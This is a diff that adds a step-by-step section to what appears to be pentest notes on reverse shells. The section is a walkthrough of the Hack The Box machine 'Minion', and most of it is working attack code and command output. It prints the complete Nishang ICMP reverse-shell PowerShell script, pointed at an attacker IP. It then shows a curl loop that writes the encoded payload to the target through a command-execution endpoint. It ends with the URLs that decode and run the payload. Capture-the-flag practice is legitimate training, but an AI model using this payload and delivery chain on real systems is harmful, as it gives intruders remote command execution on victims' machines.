@@ -32,6 +32,418 @@ nc -nlvp 51337 -e cmd.exe
 
 ### ICMP with Nishang + ICMPsh
 
+```text
+.EXAMPLE
+# sysctl -w net.ipv4.icmp_echo_ignore_all=1
+# python icmpsh_m.py 192.168.254.226 192.168.254.1
+
+Run above commands to start a listener on a Linux computer (tested on Kali Linux).
+icmpsh_m.py is a part of the icmpsh tools.
+```
+
+```text
+❯ sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
+[sudo] password for kali:
+net.ipv4.icmp_echo_ignore_all = 1
+```
+
+{% embed url="https://github.com/bdamele/icmpsh/blob/master/icmpsh\_m.py" %}
+
+We can download this script:
+
+```text
+❯ wget https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py
+--2021-08-04 09:42:08--  https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4451 (4.3K) [text/plain]
+Saving to: ‘icmpsh_m.py’
+
+icmpsh_m.py                                                100%[=======================================================================================================================================>]   4.35K  --.-KB/s    in 0s
+
+2021-08-04 09:42:09 (64.5 MB/s) - ‘icmpsh_m.py’ saved [4451/4451]
+```
+
+Check if it runs correctly:
+
+```text
+❯ python icmpsh_m.py
+missing mandatory options. Execute as root:
+./icmpsh-m.py <source IP address> <destination IP address>
+```
+
+Add your IP address at the end of the file:
+
+```text
+❯ tail -n 1 Invoke-PowerShellIcmp.ps1
+Invoke-PowerShellIcmp -IPAddress 10.10.16.185
+```
+
+Remove all the comments:
+
+```text
+function Invoke-PowerShellIcmp
+{ 
+    [CmdletBinding()] Param(
+
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $false)]
+        [Int]
+        $Delay = 5,
+
+        [Parameter(Position = 2, Mandatory = $false)]
+        [Int]
+        $BufferSize = 128
+
+    )
+
+    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
+    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+    $PingOptions.DontFragment = $True
+
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+
+    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+
+    while ($true)
+    {
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
+        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
+
+        if ($reply.Buffer)
+        {
+            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
+            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
+            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
+            $index = [math]::floor($sendbytes.length/$BufferSize)
+            $i = 0
+
+            if ($sendbytes.length -gt $BufferSize)
+            {
+                while ($i -lt $index )
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                    $i +=1
+                }
+                $remainingindex = $sendbytes.Length % $BufferSize
+                if ($remainingindex -ne 0)
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                }
+            }
+            else
+            {
+                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
+            }
+            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
+            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+        }
+        else
+        {
+            Start-Sleep -Seconds $Delay
+        }
+    }
+}
+
+
+Invoke-PowerShellIcmp -IPAddress 10.10.16.185
+```
+
+Remove break lines or empty lines:
+
+```text
+❯ cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d'
+function Invoke-PowerShellIcmp
+{
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String]
+        $IPAddress,
+        [Parameter(Position = 1, Mandatory = $false)]
+        [Int]
+        $Delay = 5,
+        [Parameter(Position = 2, Mandatory = $false)]
+        [Int]
+        $BufferSize = 128
+    )
+    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
+    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+    $PingOptions.DontFragment = $True
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+    while ($true)
+    {
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
+        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
+        if ($reply.Buffer)
+        {
+            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
+            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
+            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
+            $index = [math]::floor($sendbytes.length/$BufferSize)
+            $i = 0
+            if ($sendbytes.length -gt $BufferSize)
+            {
+                while ($i -lt $index )
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                    $i +=1
+                }
+                $remainingindex = $sendbytes.Length % $BufferSize
+                if ($remainingindex -ne 0)
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                }
+            }
+            else
+            {
+                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
+            }
+            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
+            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+        }
+        else
+        {
+            Start-Sleep -Seconds $Delay
+        }
+    }
+}
+Invoke-PowerShellIcmp -IPAddress 10.10.16.185
+```
+
+Create the new file without empty lines:
+
+```text
+❯ cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d' > icmp.ps1
+```
+
+#### Transfer via HTTP a Base64 file
+
+Since the target system is Windows is better to use PowerShell to avoid encoding problems:
+
+```text
+PS /home/kali/htb/minion> $file=Get-Content -Raw ./icmp.ps1
+PS /home/kali/htb/minion> $bytes=[System.Text.Encoding]::Unicode.GetBytes($file)
+PS /home/kali/htb/minion> $encode=[Convert]::ToBase64String($bytes)
+PS /home/kali/htb/minion> $encode | Out-File icmp.ps1.b64
+```
+
+Check if there are base64 bad characters for the URL transmission:
+
+```text
+❯ cat icmp.ps1.b64 | grep "+"
+❯ cat icmp.ps1.b64 | grep "="
+```
+
+Get the URL encoding of those characters:
+
+```php
+❯ php --interactive
+Interactive mode enabled
+
+php > print urlencode("+");
+%2B
+php > print urlencode("=");
+%3D
+php >
+```
+
+We can URL decode this to be sure:
+
+```php
+❯ php --interactive
+Interactive mode enabled
+
+php > print urlencode("+");
+%2B
+php > print urldecode("%2b");
++
+php > print urlencode("=");
+%3D
+php > print urldecode("%3d");
+=
+php >
+```
+
+Create a backup file:
+
+```bash
+❯ cp icmp.ps1.b64 icmp.ps1.b64.bak
+```
+
+Replace those bad characters with URL encoded characters:
+
+```bash
+cat icmp.ps1.b64 | sed -e 's/=/%3d/g' > icmp.ps1.b64
+```
+
+Make the spaces the same across the file with `fold`:
+
+```bash
+❯ fold icmp.ps1.b64 | head -n 1 | wc -c
+81
+❯ fold -w 80 icmp.ps1.b64 | head -n 1 | wc -c
+81
+```
+
+Create a new file:
+
+```bash
+❯ fold icmp.ps1.b64 > icmp
+```
+
+Script to upload the file:
+
+```bash
+#!/bin/bash
+
+function ctrl_c(){
+    echo -e "\nExiting..\n"
+    exit 1
+}
+
+# Ctrl+C
+trap ctrl_c INT
+
+for line in $(cat icmp); do
+    command="echo ${line} >> C:\Temp\reverse.ps1"
+    curl -s -v -X GET -G "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$command"
+done
+```
+
+Many requests will be sent:
+
+```bash
+❯ ./fileUpload.sh
+*   Trying 10.10.10.57:62696...
+* Connected to 10.10.10.57 (10.10.10.57) port 62696 (#0)
+> GET /test.asp?u=http://localhost/cmd.aspx?xcmd=echo%20ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAEkAYwBtAHAA%20%3E%3E%20C%3A%5CTemp%5Creverse.ps1 HTTP/1.1
+> Host: 10.10.10.57:62696
+> User-Agent: curl/7.74.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Cache-Control: private
+< Expires: Wed, 04 Aug 2021 16:00:54 GMT
+< Server: Microsoft-IIS/8.5
+< Set-Cookie: ASPSESSIONIDQAQBRCAB=LJOPECFBAEBCELEKAKJGPFHH; path=/
+< X-Powered-By: ASP.NET
+< Date: Wed, 04 Aug 2021 14:30:54 GMT
+< Content-Length: 163
+<
+```
+
+The file exists:
+
+```http
+http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type%20C:\Temp\reverse.ps1
+```
+
+Decode base64 file:
+
+```text
+PS /home/kali/htb/minion> $file=Get-Content ./icmp.ps1.b64.bak
+PS /home/kali/htb/minion> $decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
+PS /home/kali/htb/minion> $decode
+function Invoke-PowerShellIcmp
+{
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String]
+        $IPAddress,
+        [Parameter(Position = 1, Mandatory = $false)]
+        [Int]
+        $Delay = 5,
+        [Parameter(Position = 2, Mandatory = $false)]
+        [Int]
+        $BufferSize = 128
+    )
+    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
+    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+    $PingOptions.DontFragment = $True
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
+    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+    while ($true)
+    {
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
+        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
+        if ($reply.Buffer)
+        {
+            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
+            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
+            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
+            $index = [math]::floor($sendbytes.length/$BufferSize)
+            $i = 0
+            if ($sendbytes.length -gt $BufferSize)
+            {
+                while ($i -lt $index )
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                    $i +=1
+                }
+                $remainingindex = $sendbytes.Length % $BufferSize
+                if ($remainingindex -ne 0)
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
+                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
+                }
+            }
+            else
+            {
+                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
+            }
+            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
+            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
+        }
+        else
+        {
+            Start-Sleep -Seconds $Delay
+        }
+    }
+}
+Invoke-PowerShellIcmp -IPAddress 10.10.16.185
+```
+
+Do this in the target machine to create base64 decoded file:
+
+```http
+10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell $file=Get-Content C:\Temp\reverse.ps1; $decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file)); $decode > C:\Temp\pwned.ps1
+```
+
+We can verify that file was successfully created:
+
+```http
+http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type%20C:\Temp\pwned.ps1
+```
+
+Listen on your Kali host:
+
+```text
+❯ sudo python icmpsh_m.py 10.10.16.185 10.10.10.57
+```
+
+Execute the base64 decoded file:
+
+```http
+http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell C:\Temp\pwned.ps1
+```
+
 ### Python
 
 ```text
